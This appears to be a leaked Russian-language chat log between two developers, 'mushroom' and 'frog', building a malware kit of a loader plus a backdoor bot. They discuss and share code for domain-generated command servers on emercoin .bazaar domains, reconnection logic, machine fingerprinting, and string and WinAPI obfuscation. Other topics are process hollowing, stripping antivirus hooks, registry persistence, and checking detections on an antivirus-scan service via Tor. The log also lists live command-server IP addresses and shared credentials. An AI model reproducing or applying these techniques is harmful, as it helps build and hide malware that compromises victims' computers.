Когда генерируется имя домена на основе текущей даты получается последовательность символов (по алгоритму в ТЗ, там есть функция для этого). Как эту последовательность преобразовать в IP-адрес?

Как делать переподключение? В ТЗ сказано:
"Если в течение трех попыток был таймаут передачи, бот удваивает интервалы отправки, вплоть до достижения интервала в 30 минут."
Сколько времени (или сколько попыток) пытаться подключится к конкретному IP-адресу и когда начинать искать другой сервер?

Сейчас только HTTP-код 200 считается успешным. В ТЗ говорится про HTTP-коды 40*, 50* тоже. И как быть, если не удаётся отправить файл?

2020-07-10T09:30:10 mushroom -> frog
К этой последовательности добавь .bazaar

2020-07-10T09:30:17 mushroom -> frog
Это адрес emercoin

2020-07-10T09:34:34 mushroom -> frog
Одна попытка, подключиться к одному адресу. Прошёл все адреса во всех списках, уснул. Опять идёшь по списку адресов всех, только теперь между списками засыпаешь на 30 минут.

2020-07-10T09:35:17 mushroom -> frog
Опять не получилось, завершение работы.

2020-07-10T09:35:54 mushroom -> frog
3 попытки отправить запрос, не получилось, переподключение, опять идешь по спискам, как я писал выше.

2020-07-10T09:36:46 mushroom -> frog
Успешно только код 200, всё остальное не успешно считается, ещё две попытки тогда делаешь, не удачно и пять переподключение.

2020-07-10T09:39:33 mushroom -> frog
Я тебе пришлю пример обфускации строк и WinApi вызовов. Там просто вставишь в к себе. У тебя же всё сделано можно сказать. Твой комплект в работу пускать пора Буза сказал. Допиливай шероховатости что остались.

2020-07-10T09:42:31 mushroom -> frog
Download: https://qaz.im/load/6YnkTy/a8rKD7   
Delete: https://qaz.im/index.php?a=delete&q=70564758    
Пароль: 6#qspX.rR8@1-Y8$S

2020-07-10T09:43:51 mushroom -> frog
Обфускация строк _STR("Анси строка"), WCHAR[] wstr; lstrcpyW(wstr, L"Юникод"); используешь потом wstr где нужен юникод.

2020-07-10T09:44:42 mushroom -> frog
Обфускация строк включается макросом OBFUSCATED_STRINGS, его надо включить в Release_nologs.

2020-07-10T09:46:44 mushroom -> frog
Обфускация WinApi там и так понятно. Глобальные переменные kernel32 и т.д. это объекты классов обёрток над библиотеками WinApi, у них загрузка и получение адреса функции WinApi, и её вызов происходит на лету, по этому в бинарном файле нету следов этих функций.

2020-07-10T09:48:24 mushroom -> frog
Добавляешь заголовок winapiproxy.h и используешь объекты kernel32 и т.д. Например kernel32.getTempPath, wininet.internetOpen, wininet.internetClose.

2020-07-10T09:49:08 mushroom -> frog
Добавление новых функций для обфускации делай так же как там, просто как метод класса, там не сложно.

2020-07-10T09:49:56 mushroom -> frog
Позаменяй все строки статические у себя на _STR("строка")\_WCS("Строка")\_TSTR("Строка").

2020-07-10T09:50:34 mushroom -> frog
_TSTR превращается в _STR если не указан макрос UNICODE, и в _WCS если указан, сделано для удобства.

2020-07-10T09:52:05 mushroom -> frog
Потом проверь импорт получившегося файла, и строки в нём. Их не должно быть. Удобная утилита для просмотра exe файла http://www.mitec.cz/exe.html если надо.

2020-07-10T09:52:58 mushroom -> frog
Сделаешь. Пиши, дам тебе логин\пароль на dyncheck, там проверишь на антивирусы.

2020-07-10T09:55:19 frog -> mushroom
А в GetApi.h как можно добавить функции, которых там нет?

2020-07-10T09:58:40 mushroom -> frog
Там больше писанины:
HMODULE lib = LoadLibrary("...");
typedef void(WINAPI* functype)(void)
functype ptr = (functype)GetProcAddress(lib, "func");
ptr()

2020-07-10T09:59:13 mushroom -> frog
В том что я тебе послал это уже сделано для большого числа функций.

2020-07-10T10:00:22 mushroom -> frog
Вот например как у меня подключение к серверу сделано:
bool Commander::connect()
{
    if (addressListConnect())
        return true;

    if (emercoinListConnect())
        return true;

    if (dateListConnect())
        return true;

    debug_printf(TEXT("Sleep %u msecs\n"), TRY_CONNECT_INTERVAL);
    kernel32.sleep(TRY_CONNECT_INTERVAL);

    if (addressListConnect())
        return true;

    debug_printf(TEXT("Sleep %u msecs\n"), TRY_LIST_CONNECT_INTERVAL);
    kernel32.sleep(TRY_LIST_CONNECT_INTERVAL);

    if (emercoinListConnect())
        return true;

    debug_printf(TEXT("Sleep %u msecs\n"), TRY_LIST_CONNECT_INTERVAL);
    kernel32.sleep(TRY_LIST_CONNECT_INTERVAL);

    if (dateListConnect())
        return true;

    return false;
}

2020-07-10T10:01:06 mushroom -> frog
По всем спискам прошёл, не прокатило, уснул, опять по всем спискам, только между списками интервал 30 минут. Не прокатило завершение.

2020-07-10T10:03:25 mushroom -> frog
TRY_CONNECT_INTERVAL - 5 мин., TRY_LIST_CONNECT_INTERVAL 30 мин.

2020-07-10T12:03:37 frog -> mushroom
Хотел уточнить:
Если так случиться, что имя домена и имя компьютера будет одинаковым у двух компьютеров, то и id будут совпадать.
Вставил в id ещё дату создания папки Windows, но и эта дата может совпадать у разных машин.  Что в этом случае делать?

2020-07-10T12:04:46 mushroom -> frog
Дата создания с точность до 1 мсек используй, чтобы максимально избежать этого.

2020-07-10T12:05:40 mushroom -> frog
Тогда вероятность что всё совпадёт будет стремиться к нулю.

2020-07-10T12:08:37 mushroom -> frog
Как пример:
TCHAR sysPath[MAX_PATH + 1];
    if (!kernel32.getSystemWindowsDirectory(sysPath, MAX_PATH + 1))
    {
        debug_printf(TEXT("Can't get system windows directory, error: %u\n"), GetLastError());
        *size = 0;
        return FALSE;
    }

    HANDLE sysFolder = kernel32.createFile(sysPath, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (sysFolder == INVALID_HANDLE_VALUE)
    {
        debug_printf(TEXT("Can't open system windows directory, error: %u\n"), GetLastError());
        *size = 0;
        return FALSE;
    }

    FILETIME sysFolderFileTime = { 0 };
    if (!kernel32.getFileTime(sysFolder, &sysFolderFileTime, NULL, NULL))
    {
        debug_printf(TEXT("Can't get system windows directory file time, error: %u\n"),
            GetLastError());
        kernel32.closeHandle(sysFolder);
        *size = 0;
        return FALSE;
    }
    kernel32.closeHandle(sysFolder);

    SYSTEMTIME sysFolderSystemTime = { 0 };
    if (!kernel32.fileTimeToSystemTime(&sysFolderFileTime, &sysFolderSystemTime))
    {
        debug_printf(
            TEXT("Can't convert system windows directory file time to system time, error: %u\n"),
            GetLastError());
        *size = 0;
        return FALSE;
    }

    TCHAR creationDateStr[19];
    wsprintf(creationDateStr, _TSTR(TEXT("%u%u%u%u%u%u%u")), sysFolderSystemTime.wMonth,
        sysFolderSystemTime.wDay, sysFolderSystemTime.wYear, sysFolderSystemTime.wHour,
        sysFolderSystemTime.wMinute, sysFolderSystemTime.wSecond,
        sysFolderSystemTime.wMilliseconds);

2020-07-10T12:10:46 frog -> mushroom
Где-то читал, что эта дата фиксируется при сборке ОС, а не при установке (для некоторых версий Windows). У меня, например, дата создания папки Windows "14 ‎июля ‎2009 ‎г", хотя на самом деле установлена намного позже.

2020-07-10T12:13:10 mushroom -> frog
Проверь. Что получается, там можно брать дату создания или дату последнего изменения.

2020-07-10T12:13:25 mushroom -> frog
У меня дата создания нормальная.

2020-07-10T12:14:15 mushroom -> frog
getFileTime(sysFolder, &sysFolderFileTime, NULL, NULL) вот здесь можно брать где NULL даты последнего изменения и т.д.

2020-07-10T12:37:10 mushroom -> frog
Пока оставь дату создания с большой точностью, пока не было косяков с id ботов. Надо будет уточнить когда эта дата ставится.

2020-07-10T15:20:05 frog -> mushroom
Если команда запрошена с одного ip-адреса и потерялась связь с этим ip-адресом, то ответ можно отправлять на другой ip-адрес (который найдем по спискам) или нет? Не совсем понял, админка общая для всех ip-адресов или нет?

2020-07-10T15:20:38 mushroom -> frog
Да. Общая для всех адресов.

2020-07-10T15:21:37 mushroom -> frog
Команду запросил, получил, отправляешь результат ошибка 3 раза, переподключение, куда удалось подключиться туда и отправляй результат.

2020-07-10T15:22:20 frog -> mushroom
Понял.
В ТЗ сказано функцию get_possible_domain нужно обфусцировать. Нужно запутать, усложнить её?

2020-07-10T15:23:42 mushroom -> frog
Да можешь запутать. Ещё вызовы функций WinApi в ней обфусцируй. Я просто вызовы WinApi функций обфусцировал в ней. Можешь лишних вычислений в неё впихнуть.

2020-07-10T15:28:49 frog -> mushroom
А как в GetApi.h вычисляется кэш - 2 параметр (например, 0xC8AC8026)?
#define pCustomFunc pushargEx< DLL_KERNEL32, 0xC8AC8026, 1 >
Третий, это вроде индекс в таблице. А вот со вторым так и не разобрался.

2020-07-10T15:31:36 mushroom -> frog
Не знаю, я не разбирался. Просто использовал его, а потом свой написал Winapiproxy, GetApi падать может на разных версиях Windows, потому что там адреса функций, которые в нём используются в разных версиях windows разные.

2020-07-10T15:32:05 mushroom -> frog
По этому я его и перестал использовать, из-за неудобства.

2020-07-10T15:33:03 mushroom -> frog
Я думаю второй параметр это адрес функции в библиотеке.

2020-07-10T15:33:53 frog -> mushroom
Нужно убрать все (или частично) подключения lib-файлов, чтобы уменьшить размер исполняемого файла?

2020-07-10T15:34:46 mushroom -> frog
Winapi убрать всё кроме простых функций работы со строками, выделения памяти, освобождения памяти.

2020-07-10T15:35:31 mushroom -> frog
Размер меньше будет, чем меньше будешь использовать стандартную библиотеку.

2020-07-10T15:36:16 mushroom -> frog
Надо скрыть следы функций WinApi в бинарном файле, для этого и делаем обфускацию функций WinApi.

2020-07-10T15:36:54 mushroom -> frog
И строк тоже, чтобы например адреса сервера не были в открытую в бинарном файле видны.

2020-07-10T15:42:56 frog -> mushroom
Если локальная дата отличается от серверной (на день) вследствие того, что часовые пояса различаются, то нужно это учитывать?
Т.е. где-то уже наступил новый день (на сервере, например), а на клиенте ещё нет.

2020-07-10T15:43:23 mushroom -> frog
Не отличаются, используется время UTC.

2020-07-10T15:43:48 mushroom -> frog
В универсальном формате.

2020-07-10T15:44:36 mushroom -> frog
Не используй локальную дату.

2020-07-10T15:45:51 mushroom -> frog
SYSTEMTIME sysTime = { 0 };
    kernel32.getSystemTime(&sysTime);

2020-07-10T15:48:02 mushroom -> frog
Если там не совпадёт теоретически из-за секунд например, подключаться всё равно по спискам будет несколько часов.

2020-07-10T15:48:24 mushroom -> frog
Особенно по последнему, который на основе даты генерируется.

2020-07-10T15:48:46 mushroom -> frog
На втором проходе списков тогда дата совпадёт.

2020-07-10T15:50:11 frog -> mushroom
Третий список очень долго проверяется. В ТЗ написано 5000 подключений пытаться делать. Это нормально?

2020-07-10T15:50:23 mushroom -> frog
Да.

2020-07-10T15:52:47 mushroom -> frog
5000 адресов emercoin переберёш, которые сгенерируются на основе даты.

2020-07-10T15:56:39 frog -> mushroom
В ТЗ сказано, что времени на поиск сервера даётся 3 часа. За это время 5000 адресов, наверное, не перебрать. Или можно искать дольше, как в том примере, который был выше.

2020-07-10T16:00:16 mushroom -> frog
Как получиться 5000 адресов перебрать.

2020-07-10T16:00:32 mushroom -> frog
По мои прикидкам 5000 это меньше 3 часов.

2020-07-10T16:04:42 frog -> mushroom
У меня сейчас за 3 часа примерно 500 успевается проверять. Это, наверное, потому что использую 2 способа. Функция из библиотеки resolve_emercoin дольше проверяет emercoin адрес.

2020-07-10T16:06:41 mushroom -> frog
Перебирай по 5000, как пойдёт, если надо будет потом просто уменьшишь количество, пока 5000 за раз.

2020-07-10T16:11:37 mushroom -> frog
Пока я пошёл.

2020-07-10T16:11:54 frog -> mushroom
Пока

2020-07-13T11:38:47 frog -> mushroom
Привет!
Во время маскировки процесса при вызове ResumeThread антивирус Касперского ругается. И когда запускаешь exe-файл из папки temp ему тоже не нравится. Что с этим делать?
Постарался  максимально обфусцировать системные вызовы, но в отладчике вижу какие-то не свои вызовы WinApi где-то в прологе и эпилоге. Их можно как-то убрать?
Загрузил на github последние изменения.

2020-07-13T11:41:42 mushroom -> frog
Привет. Нет не свои нельзя убрать. В импорте у exe что там?

2020-07-13T11:41:51 mushroom -> frog
Какие функции?

2020-07-13T11:42:12 mushroom -> frog
Строки какие в бинарнике?

2020-07-13T11:42:30 mushroom -> frog
Что пишет антивирус, как называет угрозу твою?

2020-07-13T11:45:07 frog -> mushroom
Адрес            Тип     П Символ                                     Символ (undecorated)
000000013F0CA5DC Экспорт 0 OptionalHeader.AddressOfEntryPoint         
000000013F0CC000 Импорт    GetProcAddress                             
000000013F0CC008 Импорт    GetModuleHandleW                           
000000013F0CC010 Импорт    RtlCompareMemory                           
000000013F0CC018 Импорт    K32EnumProcesses                           
000000013F0CC020 Импорт    GetSystemTimeAsFileTime                    
000000013F0CC028 Импорт    SetUnhandledExceptionFilter                
000000013F0CC030 Импорт    GetCurrentProcess                          
000000013F0CC038 Импорт    TerminateProcess                           
000000013F0CC040 Импорт    IsProcessorFeaturePresent                  
000000013F0CC048 Импорт    CloseHandle                                
000000013F0CC050 Импорт    InitializeSListHead                        
000000013F0CC058 Импорт    GetCurrentThreadId                         
000000013F0CC060 Импорт    GetCurrentProcessId                        
000000013F0CC068 Импорт    QueryPerformanceCounter                    
000000013F0CC070 Импорт    GetStartupInfoW                            
000000013F0CC078 Импорт    IsDebuggerPresent                          
000000013F0CC080 Импорт    CreateEventW                               
000000013F0CC088 Импорт    WaitForSingleObjectEx                      
000000013F0CC090 Импорт    ResetEvent                                 
000000013F0CC098 Импорт    SetEvent                                   
000000013F0CC0A0 Импорт    DeleteCriticalSection                      
000000013F0CC0A8 Импорт    InitializeCriticalSectionAndSpinCount      
000000013F0CC0B0 Импорт    LeaveCriticalSection                       
000000013F0CC0B8 Импорт    EnterCriticalSection                       
000000013F0CC0C0 Импорт    UnhandledExceptionFilter                   
000000013F0CC118 Импорт    inet_ntop                                  
000000013F0CC120 Импорт    Ordinal17                                  
000000013F0CC128 Импорт    Ordinal15                                  
000000013F0CC130 Импорт    Ordinal23                                  
000000013F0CC138 Импорт    Ordinal20                                  
000000013F0CC140 Импорт    Ordinal22                                  
000000013F0CC148 Импорт    Ordinal18                                  
000000013F0CC150 Импорт    Ordinal3                                   
000000013F0CC158 Импорт    Ordinal9                                   
000000013F0CC160 Импорт    Ordinal57                                  
000000013F0CC168 Импорт    inet_pton                                  
000000013F0CC170 Импорт    Ordinal151                                 
000000013F0CC268 Импорт    RtlVirtualUnwind                           
000000013F0CC270 Импорт    RtlLookupFunctionEntry                     
000000013F0CC278 Импорт    RtlCaptureContext                          
000000013F0CC108 Импорт    __CxxFrameHandler4                         
000000013F0CC0D0 Импорт    __current_exception                        
000000013F0CC0D8 Импорт    __C_specific_handler                       
000000013F0CC0E0 Импорт    memset                                     
000000013F0CC0E8 Импорт    __std_terminate                            
000000013F0CC0F0 Импорт    __current_exception_context                
000000013F0CC0F8 Импорт    memcpy                                     
000000013F0CC250 Импорт    _set_fmode                                 
000000013F0CC258 Импорт    __p__commode                               
000000013F0CC180 Импорт    atoi                                       
000000013F0CC1C8 Импорт    _c_exit                                    
000000013F0CC1D0 Импорт    _register_thread_local_exe_atexit_callback 
000000013F0CC1D8 Импорт    _initterm                                  
000000013F0CC1E0 Импорт    _exit                                      
000000013F0CC1E8 Импорт    _configure_narrow_argv                     
000000013F0CC1F0 Импорт    exit                                       
000000013F0CC1F8 Импорт    _initialize_narrow_environment             
000000013F0CC200 Импорт    _set_app_type                              
000000013F0CC208 Импорт    _initialize_onexit_table                   
000000013F0CC210 Импорт    _seh_filter_exe                            
000000013F0CC218 Импорт    _get_narrow_winmain_command_line           
000000013F0CC220 Импорт    _initterm_e                                
000000013F0CC228 Импорт    terminate                                  
000000013F0CC230 Импорт    _cexit                                     
000000013F0CC238 Импорт    _register_onexit_function                  
000000013F0CC240 Импорт    _crt_atexit                                
000000013F0CC190 Импорт    _set_new_mode                              
000000013F0CC198 Импорт    free                                       
000000013F0CC1B8 Импорт    __setusermatherr                           
000000013F0CC1A8 Импорт    _configthreadlocale

2020-07-13T11:46:04 frog -> mushroom
И строки:
Адрес            Дизассемблированный код                      Строка                             
000000013F0CA108 lea rcx,qword ptr ds:[13F0CC3A0]             L"api-ms-win-core-synch-l1-2-0.dll"
000000013F0CA11D lea rcx,qword ptr ds:[13F0CC478]             L"kernel32.dll"
000000013F0CA132 lea rdx,qword ptr ds:[13F0CC3E8]             "SleepConditionVariableCS"
000000013F0CA142 lea rdx,qword ptr ds:[13F0CC408]             "WakeAllConditionVariable"
000000013F0CA649 or qword ptr ds:[13F0D0020],FFFFFFFFFFFFFFFF "/ "

2020-07-13T11:49:41 frog -> mushroom
Антивирусник сообщает:
PDM:Exploit.Win32.Generic.nblk
или
PDM:Exploit.Win32.Generic

2020-07-13T11:49:44 mushroom -> frog
Я тебе забыл дать логин пароль для dyncheck. Там проверять будешь, пока только на статику.

2020-07-13T11:50:11 mushroom -> frog
dyncheck.com
graddds@xmpp.jp
49gjI9gfdpgj49gpjoJKGLFDg23

2020-07-13T11:51:05 mushroom -> frog
Там проверь release_nologs 32\64 бита.

2020-07-13T11:51:20 mushroom -> frog
Напиши сколько будет детектов и что пишут.

2020-07-13T11:52:21 mushroom -> frog
Проверяй на статику, windows defender cloud выключен должен быть и интернет тоже. Там так всегда стоит по умолчанию.

2020-07-13T12:02:14 mushroom -> frog
Забыл сказать на dyncheck лучше заходить через vpn или tor.

2020-07-13T12:03:07 frog -> mushroom
Через tor зашёл.
Для версии x86 результаты проверки на dyncheck такие:
Vba32 AntiVirus Personal |   infected BScope.Trojan.Meterpreter
Windows Defender           |  VirTool:Win32/Obfuscator.QV

2020-07-13T12:03:29 mushroom -> frog
Обфусцировал GetApi.h?

2020-07-13T12:03:49 mushroom -> frog
Это из-за него может быть.

2020-07-13T12:04:00 mushroom -> frog
Такое бывало.

2020-07-13T12:04:56 mushroom -> frog
Я в коде вижу GetApi.h для обфускации используешь. Так?

2020-07-13T12:05:07 frog -> mushroom
да

2020-07-13T12:05:24 mushroom -> frog
Попробуй замени на тот что я дал.

2020-07-13T12:05:42 mushroom -> frog
На него VirTool:Win32/Obfuscator.QV не было ещё не разу.

2020-07-13T12:06:09 mushroom -> frog
Потом напиши что получилось.

2020-07-13T12:07:26 mushroom -> frog
Я отошёл.

2020-07-13T12:29:35 mushroom -> frog
В импорте нашёл Ws2_32.dll функции inet_ntop, inet_pton. Надо убрать.

2020-07-13T12:30:39 mushroom -> frog
Они наверное из resolve_emercoin

2020-07-13T12:33:42 mushroom -> frog
Download: https://qaz.im/load/d47bkf/t6te4d   
Delete: https://qaz.im/index.php?a=delete&q=925966803
Пароль: ]4so's&WSpxHK04a`

2020-07-13T12:35:13 mushroom -> frog
Можно так. Отдельно из-за того что заголовок winsock2.h должен всегда идти перед windows.h, а этого трудно добиться, из-за этого будут ошибки сборки. По этому сделано отдельным файлом, чтобы не миксовать.

2020-07-13T12:42:51 mushroom -> frog
Строк вроде не нашёл подозрительных. x86 у меня Defender сразу спалил, x64 нет. Пишет про обфускацию, скорей всего этот она палится.

2020-07-13T12:43:09 mushroom -> frog
Как заменишь обфускацию скажешь.

2020-07-13T12:43:36 mushroom -> frog
И Ws2_32 из импорта по максимуму убери.

2020-07-13T12:49:46 frog -> mushroom
Попробую ещё найти причину в GetApi.

2020-07-13T13:05:10 mushroom -> frog
Там наверное запален алгоритм, того как это работает.

2020-07-13T13:06:12 mushroom -> frog
Не затягивай. Если не проходит с GetApi.h заменяй его.

2020-07-13T15:36:26 frog -> mushroom
Динамическую проверку на dyncheck.com делать нужно?

2020-07-13T15:42:45 mushroom -> frog
Пока нет. Статическая что показывает?

2020-07-13T15:42:58 mushroom -> frog
Всё чисто?

2020-07-13T15:43:42 frog -> mushroom
Чисто. Подправил GetApi.

2020-07-13T15:44:38 mushroom -> frog
Если всё чисто для x86\x64. То динамическую проверку надо делать полным набором. То есть запускать загрузчик в этой проверке.

2020-07-13T15:44:58 mushroom -> frog
Загрузчик тоже полностью чист?

2020-07-13T15:45:07 mushroom -> frog
И обфусцирован?

2020-07-13T15:47:13 frog -> mushroom
Нет. Загрузчик ещё не готов. Закрепление не успел ещё сделать.
Не очень понимаю, как способ закрепления делать. В той статье их много описано, за какой браться, ещё не разобрался.

2020-07-13T15:47:52 mushroom -> frog
Берись за самый для тебя простой, тупа на автозапуск в реестре пусть добавляется пока.

2020-07-13T15:47:57 mushroom -> frog
Загрузчик.

2020-07-13T15:48:28 mushroom -> frog
Доделывай загрузчик тогда, обфусцируй его по примеру бота.

2020-07-13T15:48:48 mushroom -> frog
Нам нужен весь комплект (загрузчик + бот).

2020-07-13T15:48:57 mushroom -> frog
Чтобы отдать тестеру.

2020-07-13T15:53:27 frog -> mushroom
А с Касперским как быть? Чтобы он не реагировал? В processhollowing он на ResumeThread реагирует. ResumeThread пробовал по разному, не помогает.

2020-07-13T15:54:09 mushroom -> frog
ResumeThread обфусцировал?

2020-07-13T15:54:36 mushroom -> frog
Это в processhollowing или в doppelgaging?

2020-07-13T15:54:36 mushroom -> frog
Это в processhollowing или в doppelgaging?

2020-07-13T15:55:12 frog -> mushroom
Конечно. в processhollowing.  libproxy использовал

2020-07-13T15:56:02 mushroom -> frog
Посмотрю. Завтра. Пока доделывай загрузчик.

2020-07-14T12:50:43 frog -> mushroom
Привет.
Как правильно узнавать дату на сервере?
Делал так всегда: HttpQueryInfoA(hHttpRequest, HTTP_QUERY_DATE, date, &bufferSize, &index);
Пробовал ещё так: HttpQueryInfo(hHttpRequest, HTTP_QUERY_RAW_HEADERS_CRLF, cookiesBuffer, &cookiesBufferSize, &index);
Но иногда получаются разные строки дат.
И формат даты преобразовать нужно?  Потому что сейчас, например, запрос возвращает результат "Tue, 14 Jul 2020 12:47:34 GMT"
Раньше формат другой был (2020-07-14).

2020-07-14T12:56:11 mushroom -> frog
Привет. Никак не надо. Просто запрос GET /<id>/4 в заголовках дату должен вернуть.

2020-07-14T12:56:28 mushroom -> frog
Это для бота.

2020-07-14T12:59:08 mushroom -> frog
Для загрузчика запрос для получения версии, там в заголовках тоже дата будет.

2020-07-14T13:03:59 frog -> mushroom
Здесь? Только тут время (на тестовом сервере) вместо даты (поле Date).
Это результат запроса HEAD:
"HTTP/1.1 200 OK\r\nServer: nginx/1.10.3 (Ubuntu)\r\nContent-Type: text/html; charset=UTF-8\r\nConnection: keep-alive\r\nDate: 12:59:53\r\nX-Tag: v1.0\r\n\r\n"

2020-07-14T13:04:29 mushroom -> frog
На боевом проверяй.

2020-07-14T13:04:42 mushroom -> frog
На тестовом подписи нету.

2020-07-14T13:06:26 frog -> mushroom
Разбирался ещё с Process Hollowing x86. Выяснилось, что антивирус реагирует как только есть попытка что-либо записать (WriteProcessMemory) в память по адресу PebImage Base Address. Даже если один байт там поменять, он реагирует. Всё обфусцировал.

2020-07-14T13:08:05 mushroom -> frog
m_module = m_kernel32.loadLibrary(fileName);
removeHooks(m_module);

2020-07-14T13:08:25 mushroom -> frog
это в файле libraryproxy.cpp

2020-07-14T13:08:54 mushroom -> frog
Посмотри эта функция удаляет как раз ловцшки, которые ставят антивирусы на подозрительные функции.

2020-07-14T13:09:52 mushroom -> frog
Соответсвенно функция нужно потом вызывать брать и вызывать из m_module. В libraryproxy уже всё сделано для этого.

2020-07-14T13:11:53 mushroom -> frog
Удаляй так ловушки у всех библтотек WinApi, которые используешь.

2020-07-14T13:16:57 frog -> mushroom
Process Hollowing весь обфусцировал с помощью libraryproxy. 
Проверю ещё раз. Нехватало некоторых функций, который вызывает removeHooks: Rva2Offset, isForwardedFunc. Пришлось собирать их из интернета и из старой AntiHooks.cpp, может поэтому что-то не работает.

2020-07-14T13:17:57 mushroom -> frog
Сейчас пришлю что не хватает.

2020-07-14T13:20:10 mushroom -> frog
Download: https://qaz.im/load/HEFdrH/SRfi4k   
Delete: https://qaz.im/index.php?a=delete&q=1486018534
Пароль: g48CLBJb\sm=;GI0x

2020-07-14T13:52:57 frog -> mushroom
Пока не работает. Попробую ещё в отдельный проект вынести  Process Hollowing и запустить им что-нибудь. 
Как нужно запускать бот из загрузчика? В ТЗ сказано, не нужно сохранять бот на диск. Это значит, использовать тот же Process Hollowing?

2020-07-14T13:53:20 mushroom -> frog
Да.

2020-07-14T13:59:42 mushroom -> frog
Вот как у меня сделан process hollowing:
Download: https://qaz.im/load/zR8ThN/Rbsrze   
Delete: https://qaz.im/index.php?a=delete&q=2013528276
Пароль: p!N(7m%\@1PPm&fmE

2020-07-14T14:00:14 mushroom -> frog
Если нужно.

2020-07-15T12:57:25 frog -> mushroom
Привет!
Разобрался с Process hollowing x86. Долго искал причину, но нашёл. Теперь антивирус Касперского молчит. Проверил на ОС Windows 10, тоже тихо. Все вызовы ws2_32 обфусцировал. Последнюю  версию бэкдора загрузил на github.
Такой момент хотел уточнить. Иногда rundll.exe запускает rundll.exe*32 и не могу отследить момент завершения второго exe-файла (rundll.exe*32), чтобы вовремя удалить dll-файл.
Файл загрузчика куда лучше спрятать при запуске? В папку Windows?

2020-07-15T12:57:51 frog -> mushroom
Сейчас делаю загрузчик

2020-07-15T13:01:12 mushroom -> frog
В temp или appdata. За это отвечает другой человек, который делает крипт. Это такая программа внутри которой будет находится твоя программа. Он её вытаскивает и запускает. Так что тебе только стоит беспокоиться куда загружать новую версию загрузчика, в temp или appdata лучше всего.

2020-07-15T13:02:09 mushroom -> frog
Иногда rundll.exe запускает rundll.exe*32 и не могу отследить момент завершения второго exe-файла (rundll.exe*32), чтобы вовремя удалить dll-файл. Это по точнее объясни.

2020-07-15T13:06:04 mushroom -> frog
Создаёшь процесс, у тебя есть его описатель и ProcessInformation. Их завершения можно ждать WaitForSingleObject. Запомнил имя файла dll. Дождался завершения процесса, удалил. Это только если у процесса есть таймаут, если он 0, то нас дальнейшая судьба его не интересует, и судьба файла тоже.

2020-07-15T13:21:20 frog -> mushroom
А закреплять в системе тогда тот файл, который скопирую в папку temp или appdata?
По поводу rundll сейчас попробую воспроизвести эту ошибку

2020-07-15T13:22:06 mushroom -> frog
Сам себя закрепляй. Получай имя свое программы и используй его.

2020-07-15T13:22:36 mushroom -> frog
Программа должна сама себя закреплять.

2020-07-15T13:22:48 frog -> mushroom
Кажется понял

2020-07-15T13:24:39 mushroom -> frog
WCHAR filename[MAX_PATH + 1];
    if (kernel32.getModuleFileNameW(NULL, filename, _countof(filename)))

2020-07-15T13:24:52 mushroom -> frog
Так получишь имя файла своей программы.

2020-07-15T13:25:26 mushroom -> frog
Или можешь getModuleFileNameA для ANSI кодировки.

2020-07-15T13:37:33 frog -> mushroom
Хорошо. Спасибо. 
А удалить из 64-разрядной версии Release вызовы VCRUNTIME140_1.dll можно как-нибудь?

2020-07-15T13:39:49 mushroom -> frog
Это ты из стандартной библиотеки что то использовал. Удалить можно если её не использовать.

2020-07-15T13:40:07 mushroom -> frog
string использовал точно.

2020-07-15T13:40:20 mushroom -> frog
Статически линкуй.

2020-07-15T13:40:46 mushroom -> frog
Чтобы работало везде, и там где не установлено vcredist.

2020-07-15T14:29:56 frog -> mushroom
string он же самописный. Сделал статическую компоновку (/MT), 64-разрядные файлы стали запускаться.
Разобрался с rundll.exe. Ошибка была в другом: удалял файл раньше, чем нужно. Но из-за этой ошибки возник вопрос: если процесс запущен с нулевым таймаутом, нужно всё равно дождаться в отдельном потоке его завершения и удалить файл?

2020-07-15T14:30:44 mushroom -> frog
Нет. Если таймаут 0 файл и процесс нас не интересуют.

2020-07-15T14:31:27 mushroom -> frog
Всё сделал?

2020-07-15T14:32:01 mushroom -> frog
Коммить всё (загрузчик и бот).

2020-07-15T14:34:34 frog -> mushroom
Загрузчик ещё дописываю

2020-07-15T14:35:53 mushroom -> frog
Закоммитишь тогда. Чтобы запустил загрузчик, он закрепился и скачал и запустил бот. И после перезагрузки он запустился скачал и запустил бот.

2020-07-15T14:36:48 frog -> mushroom
Хорошо

2020-07-16T06:49:39 frog -> mushroom
Загрузил последние версии обоих проектов на gitlab. Проверить загрузчик не успел, так как не было доступного рабочего сервера, а с тестового серверы файлы перестали скачиваться. Попробую позже.

2020-07-16T07:08:28 frog -> mushroom
Загрузил последние версии обоих проектов на gitlab. Проверить загрузчик не успел, так как не было доступного рабочего сервера, а с тестового серверы файлы перестали скачиваться. Попробую позже.

2020-07-16T08:36:46 mushroom -> frog
По поводу адресов. Они меняются часто.

2020-07-16T08:36:55 mushroom -> frog
Вот тебе рабочие на данный момент.

2020-07-16T08:37:17 mushroom -> frog
Загрузчик: https://185.99.2.49:443,https://78.108.216.13:443,https://217.12.209.44:443,https://185.99.2.191:443,https://80.82.68.132:443,https://62.108.35.215:443

2020-07-16T08:37:58 mushroom -> frog
Бэкдор: https://45.148.120.142:443,https://80.82.68.32:443,https://185.14.31.135:443,https://194.87.145.86:443,https://85.204.116.188:443,https://185.164.32.148:443

2020-07-16T08:38:22 mushroom -> frog
Проверяй на них загрузчик и бот комплектом.

2020-07-16T08:57:26 mushroom -> frog
Как проверишь пиши.

2020-07-16T14:59:11 mushroom -> frog
По поводу проверки комплекта. Запускай загрузчик и все команды пропусти через бот, с помощью админки. Потом перезагрузи компьютер, запуститься сам уже загрузчик, и ещё раз все команды пропусти через бот.

2020-07-16T14:59:26 mushroom -> frog
Если всё пройдёт гладко. Напиши мне.

2020-07-16T14:59:52 frog -> mushroom
Хорошо

2020-07-16T15:00:29 mushroom -> frog
Это с логами и без логов проверь.

2020-07-16T15:24:40 mushroom -> frog
В каком файле у тебя адреса сервера находятся?

2020-07-16T15:24:54 mushroom -> frog
На GitlAb старые сейчас.

2020-07-16T15:25:10 frog -> mushroom
config.h

2020-07-16T15:37:01 frog -> mushroom
Скачивать файлы с этих же адресов: "/api/v130"? Пытаюсь скачать файл, получаю строку "null". Хотя на сервере все файлы загрузил

2020-07-16T15:39:08 mushroom -> frog
Да с этих. Там надо нажать кнопку с галкой, она возле шестерёнки, "To production" вплывает на ней.

2020-07-16T15:39:24 frog -> mushroom
Увидел, спасибо!

2020-07-16T15:40:07 mushroom -> frog
Если косяки с загрузкой, а ничего не изменилось, у Talar спрашивай, он серверную часть делает.

2020-07-16T15:55:48 frog -> mushroom
